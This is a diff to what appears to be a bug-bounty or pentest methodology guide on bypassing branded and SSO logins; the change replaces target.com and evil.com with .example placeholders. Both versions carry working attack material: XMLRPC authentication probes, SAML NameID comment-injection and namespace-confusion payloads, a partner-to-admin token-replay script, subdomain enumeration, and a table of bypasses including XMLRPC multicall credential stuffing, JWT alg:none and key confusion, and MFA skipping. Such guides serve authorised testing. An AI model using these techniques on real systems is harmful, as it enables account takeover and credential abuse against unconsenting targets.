@@ -159,7 +159,7 @@ When a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/si
 
 **XMLRPC auth probe (bypasses SSO):**
 ```bash
-curl -s -X POST https://target.com/xmlrpc.php \
+curl -s -X POST https://target.example/xmlrpc.php \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?>
 <methodCall>
@@ -168,7 +168,7 @@ curl -s -X POST https://target.com/xmlrpc.php \
 </methodCall>'
 
 # If 200 with method list → XMLRPC is enabled, test auth:
-curl -s -X POST https://target.com/xmlrpc.php \
+curl -s -X POST https://target.example/xmlrpc.php \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?>
 <methodCall>
@@ -198,24 +198,24 @@ print(base64.b64encode(stripped.encode()).decode())
 **SAML XML comment injection (username confusion):**
 ```xml
 <!-- Original NameID -->
-<NameID>attacker@evil.com</NameID>
+<NameID>attacker@evil.example</NameID>
 
 <!-- Injected to confuse parser -->
-<NameID>attacker@evil.com<!---->.victim@company.com</NameID>
+<NameID>attacker@evil.example<!---->.victim@company.com</NameID>
 
 <!-- Or namespace confusion -->
-<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
+<NameID xmlns:evil="http://evil.example">victim@company.com</NameID>
 ```
 
 **Partner/cross-portal token reuse test:**
 ```bash
 # Get token from partner portal
-TOKEN=$(curl -s -X POST https://partners.target.com/login \
+TOKEN=$(curl -s -X POST https://partners.target.example/login \
   -d 'email=attacker@test.com&password=pass' \
   -c cookies.txt | grep -o 'token=[^;]*')
 
 # Replay against admin portal
-curl -s https://admin.target.com/dashboard \
+curl -s https://admin.target.example/dashboard \
   -H "Authorization: Bearer $TOKEN" \
   -H "Cookie: $TOKEN"
 ```
@@ -239,7 +239,7 @@ grep -r "xmlrpc" scope_urls.txt
 grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js
 
 # Find partner/admin subdomains
-subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
+subfinder -d target.example | grep -E "(admin|partner|internal|sso|auth|login)"
 ```
 
 ---
@@ -270,7 +270,7 @@ subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
 | Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |
 | CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |
 | JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |
-| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |
+| Separate session stores per portal | Check if cookie domain is `.target.example` (wildcard) — cookie bleeds between subdomains |
 | MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |
 
 **XMLRPC multicall for mass auth bypass:**
